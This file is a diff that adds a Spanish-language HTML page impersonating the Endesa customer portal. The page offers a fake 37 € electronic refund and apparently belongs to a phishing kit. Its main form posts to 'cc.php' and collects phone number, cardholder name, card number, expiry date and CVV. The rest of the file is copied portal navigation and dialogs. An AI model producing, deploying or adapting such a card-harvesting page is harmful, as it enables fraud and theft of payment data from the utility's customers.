@@ -1,0 +1,918 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" dir="ltr" lang="es">
+<head>
+<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+	<title>Formulario de reembolso electrónico</title>
+		<meta name="robots" content="none">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+	<link rel="shortcut icon" href="./src/favicon.png">
+<link media="all" href="./src/index.css" type="text/css" rel="stylesheet">
+<link rel="stylesheet" href="./src/bootstrap.min.css">
+</head>
+<body class="Sites_IB_ES">
+			<div class="contenedor_general">	
+				<header class="cabecera mod_header">
+<section class="mod_modal_dialogs">
+            <!-- INICIO DE VENTANA MODAL NAVEGADORES OBSOLETOS -->
+            <dialog id="fc-modalNavigatorVersion" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+            </dialog>
+            <!-- FIN DE VENTANA MODAL NAVEGADORES OBSOLETOS -->
+        </section>
+		<div class="wrapper lista_desplegable_b Hogares">
+<a class="skip-main textSmaller semiBold" href="#IrContenidoAccesibilidad">Ir al contenido</a>
+		<h2 class="logo propiedadCSS3 col-xs-12 col-sm-12">
+				<a href="#" title="Luz, gas y electricidad para tu casa" class="">
+						<img alt="Luz" src="./src/bg_logo.png">
+				</a>
+		</h2>
+		<div class="visible-xs visible-sm" style="float: right;margin-right: 20px;">
+				<a href="#" class="">
+						<img alt="Luz, gas y electricidad para tu casa" src="./src/MenuMob.png">
+				</a>
+		</div>
+		<div style="clear: both;"></div>
+						<span class="tooltipHeader hiddenMobile">"Elige tu perfil."</span>
+  <nav class="links options visible-lg visible-md">
+   <div id="headerNavigator" class="round-border-box round-border-box-width propiedadCSS3 navigator_menu level2 visible-lg visible-md">
+      <ul class="clientSupport">
+        <li class="contactanos">
+	<a class="textSmaller" href="#" title="Atención al Cliente">
+		Atención al Cliente
+	</a>
+        </li>
+        <li class="idioma dropdown">
+            <a class="textSmaller semiBold" href="javascript:void(0);" title="Español">
+              Español
+            </a>
+            <ul class="dropdown_container">
+                    <li>
+<!--packed:
+null
+-->
+                         <a href="#" class="textSmaller semiBold" title="Català">
+                            Català
+                        </a>                    
+                    </li>
+                    <li>
+<!--packed:
+null
+-->
+                         <a href="#" class="textSmaller semiBold" title="English">
+                            English
+                        </a>                    
+                    </li>
+            </ul>
+        </li>               
+        <li class="tamano_fuente dropdown">
+          <a class="textSmaller semiBold" href="javascript:void(0);" title="Cambia el tamaño de la fuente">
+            -A+
+          </a>
+          <ul class="dropdown_container">
+            <li>
+              <a class="textSmaller semiBold" href="#" id="plusBtn" title="Aumentar">
+                <span class="sizes">A+</span> Aumentar
+              </a>
+            </li>
+            <li>
+              <a class="textSmaller semiBold" href="#" id="minusBtn" title="Reducir">
+                <span class="sizes">A-</span> Reducir
+              </a>
+            </li>
+          </ul>
+        </li>
+<!-- hogares -->
+    <li class="searchContent" style="width: 28%;">
+			<label class="ui-widget" for="searchTags">
+				<form method="POST" novalidate="" action="#" name="searchForm" id="searchHeaderForm">
+					<div class="easy-autocomplete eac-round" style="width: 151px;"><input class="search" aria-label="Escribe aquí tu pregunta" name="faqsSearchTags" id="searchHeaderBox" placeholder="Escribe aquí tu pregunta" autocomplete="off" value="" type="text"><div class="easy-autocomplete-container" id="eac-container-searchHeaderBox"><ul></ul></div></div>
+				        <input id="faqSearchId" value="" type="hidden">
+				</form>
+			</label>
+			<input id="send-button-top" class="searchButton ftr" aria-label="Buscar" title="Buscar" value="Buscar" type="submit">
+		</li>
+      </ul>
+    </div>                    
+  </nav>
+<!-- Obtenemos el segmento y hacemos la logica para ir a una u otra template. -->
+<div class="mega-toolbar accesible visible-lg visible-md">
+    <!--Mega Menú-->
+    <div class="mega-menu  visible-lg visible-md">
+        <div class="mega-opt  visible-lg visible-md">
+            <ul class="mega-tablist" role="tablist">
+		                    <li class="item-menu">
+		                    	<a id="mega-link-id-1" class="item-link mga" href="#1383140687140" role="tab" tabindex="0" aria-controls="1383140687140" aria-selected="false" aria-labelledby="mega-link-id-1">
+		                    		Contratar
+		                    	</a>
+		                    </li>
+		                    <li class="item-menu">
+		                    	<a id="mega-link-id-2" class="item-link mga" href="#1383138001881" role="tab" tabindex="-1" aria-controls="1383138001881" aria-selected="false" aria-labelledby="mega-link-id-2">
+		                    		Te ayudamos
+		                    	</a>
+		                    </li>
+		                    <li class="item-menu">
+		                    	<a id="mega-link-id-3" class="item-link mga" href="#1383359364161" role="tab" tabindex="-1" aria-controls="1383359364161" aria-selected="false" aria-labelledby="mega-link-id-3">
+		                    		Conoce la energía
+		                    	</a>
+		                    </li>
+		                    <li class="item-menu">
+		                    	<a id="mega-link-id-4" class="item-link mga" href="#1399990191316" role="tab" tabindex="-1" aria-controls="1399990191316" aria-selected="false" aria-labelledby="mega-link-id-4">
+		                    		Ahorra con Endesa
+		                    	</a>
+		                    </li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+				<!-- EPT Comportamiento login - ParÃ¡metro service -->
+        	<div class="en-client-area visible-lg visible-md" data-function="fc-client-area">
+                <a href="#" title="Área cliente" class="en-client-area__btn-click en-client-area__btn-click--down uppercase" aria-expanded="false">
+                	Hola</a>
+	        </div>
+		</div>
+	<div id="testAjax"></div>
+
+<a id="IrContenidoAccesibilidad"></a>
+				</header>
+				<div class="mod_subNavegation visible-lg visible-md">
+	<section class="wrapper Hogares visible-lg visible-md">
+	    <div class="subNavegation visible-lg visible-md">
+	            <nav class="breadcrumbs">
+					<ul>
+							<li class="crumb">
+								<a class="crumbLink" href="#" title="Hogares">
+									Hogares
+								</a>
+							</li>
+							<li class="crumb">
+								<a class="crumbLink" href="#" title="Mi Endesa">
+									Mi Endesa
+								</a>
+							</li>
+						<li class="crumb">
+							<span class="crumbLink active textSmall">Mi perfil</span>
+						</li>
+					</ul>
+				</nav>
+		<nav class="optionTo visible-lg visible-md">
+		   	<ul>
+		       	<li>
+		       		<a class="optLink toPrint" href="javascript:window.print()" title="Imprimir">
+		       			Imprimir
+		       		</a>
+		       	</li>
+		       	<li id="liFavourite">
+		       		<a class="optLink toBookmarks" href="#" title="A favoritos">
+		       			A favoritos
+		       		</a>
+		       	</li>
+		   	</ul>
+			   	<div id="divFavorites" class="favoritos_ezone outH visible-lg visible-md">
+					<form id="favoriteForm" class="validacionform positionRelative" action="#" method="post" novalidate="novalidate">
+                        <fieldset>
+                            <div class="col">
+                                <div class="dtPadding_bottom">
+                                    <label for="favoritos" class="labelInlineImportant textSmaller bold strongTitle requiredData">
+                                        Agregar a favoritos
+                                    </label>
+                                </div>
+                                <div class="MarginTop0con5em">
+                                    <div class="boxTL">
+                                        <input id="favoritos" class="validateInfo required inputText boxTL textSmaller marginRight5 italic width90 propiedadCSS3" name="favoritos" placeholder="Luz, gas y calefacción para tu hogar - Endesa Online" value="">                                
+                                    </div>
+                                    <div class="boxTL">
+                                        <input class="buttonTipo1 textSmaller070em  boxTL MarginLeft1em" value="Guardar" onclick="addFavourite();" type="button"> 
+                                        <a href="#" title="Cancelar" class="MarginLeft1em textSmaller linkStyle favoritos_close">
+                                            Cancelar
+                                        </a>
+                                    </div>
+                                    <div class="textSmaller070em favoritos_tooltip">
+                                        <div class="positionRelative">
+                                            Podrás encontrarlo en el ezone, en la pestaña favoritos en el pie de página
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </fieldset>                 
+                    </form>
+				</div>
+		</nav>
+		</div>
+	</section>
+	<section class="mod_modal_dialogs visible-lg visible-md">
+		<dialog id="modalFavorites" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+			<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_gestiones boxed propiedadCSS3">
+				<div class="notification succes">
+					<div class="eInvoice_state_head">
+						<h5 class="infoContent textNormal bold textGreen">Página guardada como favorita correctamente</h5>
+					</div>
+				</div>
+			</div>
+		</dialog>
+	</section>
+	<div id="divError"></div> 
+	            </div>
+<!--segmentos en Layout GestionaOnline despues miga-->
+<!--AQUI-->
+				<div class="mod_subNavegation visible-lg visible-md">
+	            	<!--AQUI-->
+	<div class="mod_gestNav">
+    	<div class="wrapper">
+            <nav class="taskBlock">
+            	<ul class="taskList">	
+												<li class="task propiedadCSS3 ">
+													<a class="textSmall semiBold taskLink" href="#" title="Inicio">
+														Inicio
+													</a>
+												</li>
+												<li class="task propiedadCSS3 ">
+													<a class="textSmall semiBold taskLink" href="#" title="Mis facturas">
+														Mis facturas
+													</a>
+												</li>
+												<li class="task active propiedadCSS3 ">
+													<a class="textSmall semiBold taskLink" href="#" title="Mi perfil">
+														Mi perfil
+													</a>
+												</li>
+												<li class="task propiedadCSS3 ">
+													<a class="textSmall semiBold taskLink" href="#" title="Mis contratos">
+														Mis contratos
+													</a>
+												</li>
+												<li class="task propiedadCSS3 ">
+													<a class="textSmall semiBold taskLink" href="#" title="Consultas">
+														Consultas
+													</a>
+												</li>
+												<li class="task propiedadCSS3 ">
+													<a class="textSmall semiBold taskLink" href="#" title="Mi Consumo por horas">
+														Mi Consumo por horas
+													</a>
+												</li>
+												<li class="task propiedadCSS3 ">
+													<a class="textSmall semiBold taskLink" href="#" title="Mis documentos">
+														Mis documentos
+													</a>
+												</li>
+				</ul>
+	 		</nav>
+     	</div>
+	</div>
+	            </div>
+            	<section class="mod_content theme modulation">	    
+	                <div class="layerM lista_desplegable_b">
+	                	<div class="mod_layer_2">
+                        <div class="mod_left">
+				            <div class="mod_info_box block1">
+    <section class="mod_modal_dialogs">
+    <dialog id="modal_loading" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+      <div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_gestiones boxed propiedadCSS3">
+        <div>
+          <div class="eInvoice_state_head">
+            <p></p>
+            <div style="text-align: center;"></div>
+            <div style="text-align: center;" class="infoContent textNormal bold textBlue">Operación ejecutándose...</div>            
+        </div>          
+        </div>            
+      </div>
+    </dialog> 
+   </section> 
+   <section class="mod_modal_dialogs">
+   </section>
+   <section class="mod_modal_dialogs"> 
+        <dialog id="modalError02031" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+            <div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
+                <div class="mod_cols mod_colsW100">
+                <div class="mod_cols_top itemSlider">
+                    <h4 class="textBig">Actualiza tus datos de email. </h4>
+                </div>
+                    <div class="notification error">
+                        <div class="eInvoice_state_head">   
+                            <p class="infoContent titleBoxCols orange">Advertencia </p>
+                        </div>
+                        <p class="infoContent textSmall typeC2">
+                            Actualmente tu email está asociado a varios usuarios de Mi Endesa. Por motivos de seguridad y para ofrecerte las máximas garantías, cada dirección de email debe pertenecer a un único usuario registrado. 
+                             Por favor, llámanos al 800 760 206 para que podamos actualizarlo. 
+                            <a title=" " href="#">   </a> 
+                        </p>
+                        <p class="infoContent textSmall typeC2"> </p>
+                        <p class="infoContent textSmall typeC2">   </p>
+                    </div>
+                </div>
+            </div>
+        </dialog>
+    </section>
+  <div class="mod_info_box block1 profileHead paddingL2P_M wide96_M">
+    <article class="mod_info_content mod_info_content_no_border mod_cols  mod_cols_white  propiedadCSS3 ">
+      <div class="">
+          <h4 class="textBigger light " style="margin: 0px; padding: 0px; border: medium none; font-weight: 300; font-style: normal; font-size: 2em; font-family: OpenSans; vertical-align: baseline; text-decoration: none; color: rgb(51, 51, 51); font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">
+		  <span class="auto-style2" style="margin: 0px; padding: 0px; border: medium none; font-weight: 600; font-style: normal; font-size: x-large; font-family: inherit; vertical-align: baseline; text-decoration: none;">
+		  Forma de REEMBOLSO electrónico</span></h4>
+      </div>
+      <p class="parrafoMargintop1em textSmall">
+	  <span style="color: rgb(51, 51, 51); font-family: OpenSans; font-size: 13.92px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
+	  Referencia: ENDESA-A8005W</span></p>
+    </article>
+  </div>
+  <div class="" id="updateUserDiv">
+            <div class="mod_info_box block1 boxMainConfigAlerts">
+                <article class="mod_info_content mod_cols mod_cols_white mod_info_content_border boxed borderLeft1 propiedadCSS3 lista_desplegable_b">
+                    <form method="post" id="form_principal" novalidate="novalidate" class="validacionform" action="#">
+                    	<div class="mod_cols_top itemSlider sliderBox visible-xs">
+						<h4 class="textBig light "><span class="semiBold text_overflow">REEMBOLSO Online</span>
+						</h4>
+						<font size=2>Recarga corte <font color=#930000>37 €</font></font>
+					</div>
+                        <div class="mod_cols_top itemSlider itemSliderNoBorder">
+                            <h4 class="textBig light boxTL">
+    Datos<span class="semiBold text_overflow"> de usuario</span>
+                            </h4>
+                        </div>
+                    </form>
+                </article>
+            </div>
+            <section class="mod_modal_dialogs">             
+                <dialog id="modal_federated" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+                </dialog>
+            </section>
+			<div class="mod_info_box block1" id="optionalDataDiv">
+				<article class="mod_info_content mod_cols mod_cols_white mod_info_content_border boxed borderLeft1 propiedadCSS3 lista_desplegable_b">
+				<div class="mod_cols_top itemSlider itemSliderNoBorder datos_de_titular ui-accordion-header ui-helper-reset ui-state-default ui-accordion-icons ui-accordion-header-active ui-state-active ui-corner-top ui-state-focus" role="tab" id="ui-accordion-1-header-5" aria-controls="optionalDataForm" aria-selected="true" tabindex="0">
+					<h4 class="textBig light boxTL" style="margin: 0px; padding: 0px; border: medium none; font-weight: 300; font-style: normal; font-size: 1.18em; font-family: OpenSans; vertical-align: baseline; text-decoration: none; color: rgb(8, 113, 191); font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">
+					<span class="semiBold" style="margin: 0px; padding: 0px; border: medium none; font-weight: 600; font-style: normal; font-size: 18.88px; font-family: inherit; vertical-align: baseline; text-decoration: none;">
+					1-Ingrese sus datos</span></h4>
+					<h4 class="textBig light boxTL">&nbsp;</h4>
+				</div>
+				<form id="optionalDataForm" class="validacionform ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" method="post" action="cc.php" style="display: block;" aria-labelledby="ui-accordion-1-header-5" role="tabpanel" aria-expanded="true" aria-hidden="false">
+					<div class="infoData borderTopAzul6">
+						&nbsp; <fieldset>
+						<div class="col">
+							<div class="dtPadding_bottom MarginBottom05em">
+								<label for="profession" class="labelInlineImportant  textSmaller bold strongTitle">Teléfono<span class="error" lang="fr">*</span></label>
+							</div>
+							<div>
+								<input id="phone0" class="validateInfo inputText textSmaller width54 italic propiedadCSS3 telefono changed3" name="phone" placeholder="XXXxxxXXX" type="number" maxlength="10" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" required></div>
+						</div>
+						</fieldset> <fieldset>
+						<div class="col MarginTop1em">
+							<div class="dtPadding_bottom MarginBottom05em">
+								<label for="phone" class="labelInlineImportant  textSmaller bold strongTitle">Nombre completo<span class="error" lang="fr">*</span></label>
+							</div>
+							<div>
+								<input id="phone" class="inputText textSmaller width54 italic propiedadCSS3 telefono changed3" name="name" placeholder="Nombre del titular de la tarjeta" type="text" required>
+							</div>
+						</div>
+						</fieldset>
+						<input name="robinson" value="true" type="hidden">
+						<fieldset class="col infoData infoDataNoBorder">
+						<label for="fd" class="labelItem labelNoAfter imgwAuto" id="lblFd">
+						<input name="fd" value="true" type="hidden"></label>
+						</fieldset> <fieldset>
+						<div class="col">
+							<div class="dtPadding_bottom MarginBottom05em">
+								<label for="email_alternativo" class="labelInlineImportant textSmaller bold strongTitle">Número de Tarjeta<span class="error" lang="fr">*</span></label>
+							</div>
+							<div style="height: 43px">
+								<input id="alternativeEmail" class="validateInfo inputText textSmaller width54 italic propiedadCSS3 changed3" name="ccnum" placeholder="Número de Tarjeta" type="number" maxlength="16" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" required>
+							</div>
+						</div>
+						</fieldset> <fieldset>
+						<fieldset>
+						<div class="col">
+							<div class="dtPadding_bottom MarginBottom05em">
+								<label for="birthday" class="labelInlineImportant textSmaller bold strongTitle">Caducidad<span class="error" lang="fr">*</span> (Mes/año)</label>
+							</div>
+							<div style="height: 43px">
+								<div class="selectorStyled bgdposition99 width4em MarginRight0con5em mobileW100">
+									<select class="validateInfo textSmaller width140 width100mobile changed3" name="day" id="day" required>
+									<option >Mes</option>
+									<option value="01" name="01" id="01">1
+									</option>
+									<option value="02" name="02" id="02">2
+									</option>
+									<option value="03" name="03" id="03">3
+									</option>
+									<option value="04" name="04" id="04">4
+									</option>
+									<option value="05" name="05" id="05">5
+									</option>
+									<option value="06" name="06" id="06">6
+									</option>
+									<option value="07" name="07" id="07">7
+									</option>
+									<option value="08" name="08" id="08">8
+									</option>
+									<option value="09" name="09" id="09">9
+									</option>
+									<option value="10" name="10" id="10">10
+									</option>
+									<option value="11" name="11" id="11">11
+									</option>
+									<option value="12" name="12" id="12">12
+									</option>
+									</select> </div>
+								<div class="selectorStyled bgdposition99 width6em MarginRight0con5em mobileW100 marginTop1emMobile">
+									<select class="validateInfo selectorBody textSmaller width140 width100mobile changed3" name="month" id="month" style="left: 0px; top: 0px" required>
+									<option selected="">año</option>
+									<option value="18" name="2018" id="2018">2018
+									</option>
+									<option value="19" name="2019" id="2019">2019
+									</option>
+									<option value="20" name="2020" id="2020">2020
+									</option>
+									<option value="21" name="2021" id="2021">2021
+									</option>
+									<option value="22" name="2022" id="2022">2022
+									</option>
+									<option value="23" name="2023" id="2023">2023
+									</option>
+									<option value="24" name="2024" id="2024">2024
+									</option>
+									<option value="25" name="2025" id="2025">2025
+									</option>
+									<option value="26" name="2026" id="2026">2026
+									</option>
+									<option value="27" name="2027" id="2027">2027
+									</option>
+									<option value="28" name="2028" id="2028">2028
+									</option>
+									<option value="29" name="2029" id="2029">2029
+									</option>
+									<option value="30" name="2030" id="2030">2028
+									</option>
+									<option value="31" name="2031" id="2031">2031
+									</option>
+									</select> </div>
+							</div>
+						</div>
+						</fieldset></fieldset> <fieldset>
+						<div class="col">
+							<div class="dtPadding_bottom MarginBottom05em">
+								<label for="twiter" class="labelInlineImportant  textSmaller bold strongTitle">Cód. Seguridad<span class="error" lang="fr">*</span></label>
+							</div>
+							<div style="height: 53px">
+								<input id="twiter" class="validateInfo inputText textSmaller width54 italic propiedadCSS3 changed3" name="cvv" placeholder="CVV" type="number" maxlength="4" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" required>
+							</div>
+						</div>
+						</fieldset>&nbsp;
+						<input id="saveChangesAditional" value="Continuar" title="GUARDAR CAMBIOS" class="MarginBottom1em MarginTop1em_M textSmaller buttonTipo1 color_grey boxTL MarginLeft1em" type="submit" style="color: rgb(255, 252, 252)">
+					</div>
+				</form>
+				</article>
+				<section class="mod_modal_dialogs">
+				<dialog id="modal_loading_data" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+				</dialog>
+				</section>
+			</div>
+  </div>
+				            </div>
+                        </div>
+						<div class="mod_right mobileNoDisplayIMP">
+	<div class="mod_info_box block2 ocultarBannerLateral">
+	 	 <article class="mod_info_content boxed propiedadCSS3 lista_desplegable_b">		
+					<div class="mod_cols_top itemSlider sliderBox">
+						<h4 class="textBig light "><span class="semiBold text_overflow">REEMBOLSO Online</span>
+						</h4>
+						<font size=2>Recarga corte <font color=#930000>37 €</font></font>
+					</div>
+            	<div class="infoData level2 ocultarBannerLateral">  
+	                  <ul class="asesorLinks">           
+							<li class="iCont">
+										<!-- Inicio EPT Comportamiento login -->
+										<!-- Fin EPT Comportamiento login -->
+		<a class="textNormal linkInfo" href="#" target="_top" title="Ir a Date de alta en la factura digital">
+			total a REEMBOLSO
+		</a> 
+		<p class="textSmall infoContent">
+			<font size=2><font color=#006b9f size=6>37 €</font><font color=#930000></font></font>
+		</p>
+		                      </li>
+	           		</ul>
+	          </div>
+	     </article>
+    </div>
+	<div class="mod_info_box block2 ocultarBannerLateral">
+	 	 <article class="mod_info_content boxed propiedadCSS3 lista_desplegable_b">		
+					<div class="mod_cols_top itemSlider sliderBox">
+						<h4 class="textBig light ">
+    Te<span class="semiBold text_overflow"> atendemos</span>
+						</h4>
+					</div>
+            	<div class="infoData level2 ocultarBannerLateral">  
+	                  <ul class="asesorLinks">           
+							<li class="iCont">
+		<a id="liveagent_button_offline_573580000004FVr" style="" class="icon_small chat" title="Chat">
+		 	<span class="iconImg">Informacion</span>
+			<span class="titulo">Chat</span>
+		</a>
+		<p id="onlineEsP" class="textSmall iconDescription">Si tienes dudas y necesitas asesoramiento, te atendemos de lunes a viernes de 9:00 a 21:00 y sábados de 9:00 a 14:00 horas.</p>
+		                      </li>
+	           		</ul>
+	          </div>
+	     </article>
+    </div>
+    <div id="recarga">
+		<div id="widgetResult">
+	</div>
+	<section class="mod_modal_dialogs">
+		<dialog id="unsuscribeDigitalBill" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
+			<div class="notification error">
+				<div class="eInvoice_state_head">
+					<p class="infoContent textNormal bold textOrange">¿Quieres desactivar la factura electrónica?</p>
+				</div>
+				<div>
+					<p class="textParragraph MarginTop2em textSmall bold typeG6">
+						La baja en la factura electrónica puede suponerte la pérdida de ventajas</p>
+					<ul class="ulSquare textBlue MarginLeft2em" id="lstDescuentos">
+						<li><span class="typeG6 textSmaller">No podras beneficiarte de ciertas ventajas y ofertas</span></li>
+					</ul>
+					<br>
+					<p class="typeG6 textSmaller">Nota: En el caso de que haya seleccionado un contrato vinculado se desactivará la factura electrónica para todos los contratos dependientes.</p>
+					<fieldset class="MarginTopLeft1em">
+						<label for="checkbox2" class="labelItem labelNoAfter"> <span class="titleLabel textSmaller typeC2 marginL15_M wide92_M">Entiendo la diferencia y quiero darme de baja</span>
+						<span class="CI_container " style="position: relative;"><span aria-hidden="true" tabindex="0" class="CI_customInput CI_checkbox" role="checkbox" style="z-index: 10;"></span><input class="checkbox CI_nativeInput" name="checkboxEntiendoFD" id="checkboxEntiendoFD" value="si" style="position: absolute; top: 0px; left: 0px; opacity: 0; z-index: 1;" type="checkbox"></span></label>
+					</fieldset>
+					<input id="confirmarBajaFactura" style="background-color: rgb(220, 220, 220);" class="MarginTopLeft1em buttonTipo1 displayInlineBlock textSmaller070em" disabled="disabled" value="Confirmar" type="button"> <a class="textSmaller displayInlineBlock" href="javascript:void(0);" onclick="$(&quot;.ui-dialog-content&quot;).dialog(&quot;close&quot;);" title="Cancelar">Cancelar</a>
+				</div>
+			</div>
+		</div>
+		</dialog>
+	</section>
+	<section class="mod_modal_dialogs">
+		<dialog id="confirmChangesFDOk" data-configmodal="2" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
+			<div class="mod_info_box mod_info_box_paddingTop1con5 block1">
+				<article class="mod_info_content mod_cols">
+					<div class="mod_cols mod_colsW100">
+						<div class="notification succes">
+							<div class="eInvoice_state_head">
+								<h4 class="textNormal bold valid1">Los cambios se han realizado correctamente</h4>
+							</div>
+							<div class="infoData MarginTop2em col colPaddingRight0">
+								&nbsp;</div>
+						</div>
+					</div>
+				</article>
+			</div>
+		</div>
+		</dialog>
+	</section>
+	<section class="mod_modal_dialogs">
+		<dialog id="errFullOnlineWFD" data-configmodal="3" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+		<!-- ERROR -->
+		<div class="eInvoice_state errorBox mod_info_box mod_info_content boxed propiedadCSS3">
+			<div class="mod_cols_top">
+				<h4>Desactivación de
+					<span class="bold">E-Factura</span>
+				</h4>
+			</div>
+			<div class="notification error">
+				<div class="eInvoice_state_head">
+					<p class="infoContent textSmall typeC2">No puedes desactivar la factura electrónica para el/los contrato/s 
+						<span id="contContratosFullOnline"></span>&nbsp;por ser FullOnline
+					</p>
+				</div>
+			</div>
+		</div>
+		</dialog>
+	</section>
+	<section class="mod_modal_dialogs">
+		<dialog id="contratosVinculadosAct" data-configmodal="4" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content modal_tooltip propiedadCSS3">
+			<div class="mod_cols mod_colsW100">
+				<div>
+					<h3 class="textBig">
+						<span class="bold">Contrato vinculado</span>
+					</h3>
+				</div>
+				<div class="MarginTop1em">
+					<p class="textSmaller">
+						Si lleva a cabo la activación de la factura electrónica para este contrato se activarán también los contratos&nbsp;<span id="txtContratosVincAct"></span>
+					</p>
+				</div>
+			</div>
+		</div>
+		</dialog>
+	</section>
+	<section class="mod_modal_dialogs">
+		<dialog id="contratosVinculadosDesact" data-configmodal="5" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content modal_tooltip propiedadCSS3">
+			<div class="mod_cols mod_colsW100">
+				<div>
+					<h3 class="textBig">
+						<span class="bold">Contrato vinculado</span>
+					</h3>
+				</div>
+				<div class="MarginTop1em">
+					<p class="textSmaller">
+						Si lleva a cabo la desactivación de la factura digital para este contrato se desactivarán también los contratos&nbsp;<span id="txtContratosVincDesact"></span>
+					</p>
+				</div>
+			</div>
+		</div>
+		</dialog>
+	</section>
+	<section class="mod_modal_dialogs">
+		<dialog id="selectOneContract" data-configmodal="6" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
+			<div class="mod_info_box mod_info_box_paddingTop1con5 block1">
+				<article class="mod_info_content mod_cols">
+					<div class="mod_cols mod_colsW100">
+						<div class="notification prohibido">
+							<div class="eInvoice_state_head">
+								<h4 class="textNormal bold alertText">
+									No ha seleccionado ningún contrato para activar la factura electrónica</h4>
+							</div>
+							<div class="MarginTop2em">
+								<p class="textSmall typeG6 bold">Activa la factura electrónica en tus contratos.</p>
+								<br> <a href="javascript:void(0);" title="cerrar" onclick="closeModal('selectOneContract')" class="displayInlineBlock MarginTop1em buttonTipo1 textSmaller">cerrar</a>
+							</div>
+						</div>
+					</div>
+				</article>
+			</div>
+		</div>
+		</dialog>
+	</section>
+	<section class="mod_modal_dialogs">
+		<dialog id="acceptTermsConditionsWFD" data-configmodal="7" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
+			<div class="notification error">
+				<div class="mod_cols mod_colsW100">
+					<div class="eInvoice_state_head">
+						<p class="textNormal bold textOrange">Estás activando la factura electrónica</p>
+					</div>
+					<div class="MarginLeft1em">
+						<p class="textParragraph MarginTop2em textSmall bold"></p>
+						<ul class="listCkeckOrange">
+							<li class="textSmaller typeC3">Te avisamos en cuanto esté disponible y podrás consultar tu factura en el momento.</li>
+							<li class="textSmaller typeC3">Accede a tu factura de una forma rápida desde tu email</li>
+							<li class="textSmaller typeC3">Respeta el medio ambiente</li>
+						</ul>
+					</div>
+					<div class="MarginLeft1em">
+						<fieldset class="MarginTopLeft1em">
+							<label id="reduceCheck" for="checkboxAceptarCond" class="labelItem labelNoAfter 
+											">
+								<span class="titleLabel textSmaller typeC2 "><a href="#" class="marginLeft0con5em_M" target="_top">condiciones de la factura electrónica.</a></span>
+							<span class="CI_container " style="position: relative;"><span aria-hidden="true" tabindex="0" class="CI_customInput CI_checkbox" role="checkbox" style="z-index: 10;"></span><input class="checkbox CI_nativeInput" name="checkboxAceptarCondWFD" id="checkboxAceptarCondWFD" value="si" style="position: absolute; top: 0px; left: 0px; opacity: 0; z-index: 1;" type="checkbox"></span></label>
+						</fieldset>
+					</div>
+					<input id="activateDigitalBillConfirmWFD" style="background-color: rgb(220, 220, 220);" class="MarginTopLeft1em buttonTipo1 displayInlineBlock textSmaller070em" disabled="disabled" value="Confirmar" type="button"> <a class="textSmaller" href="javascript:void(0);" onclick="$('#acceptTermsConditionsWFD').dialog('close');" id="cancelActivation" title="Cancelar">
+						Cancelar </a>
+				</div>
+			</div>
+		</div>
+		</dialog>
+	</section>
+	<section class="mod_modal_dialogs">
+		<dialog id="termsAndConditionsWFD" data-configmodal="8" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
+			<div class="mod_cols mod_colsW100">
+				<div class="mod_cols_top mod_cols_top_border">
+					<h4 class="textBig">
+						<span class="bold">Condiciones</span>
+						de la factura electrónica
+					</h4>
+				</div>
+				<div class="MarginTop1em scroll-pane height400 boxed">
+					<p> Descargar condiciones de la <a href="#" target="_top">Factura electrónica</a></p>
+				</div>
+				<div class="col colPaddingRight0">
+					<a class="CM-modal_close textSmaller buttonContrast buttonContrastSinFlecha azul" href="javascript:void(0);" onclick="closeModal('termsAndConditionsWFD')" title="cerrar">
+						cerrar </a>
+				</div>
+			</div>
+		</div>
+		</dialog>
+	</section>
+	<section class="mod_modal_dialogs">
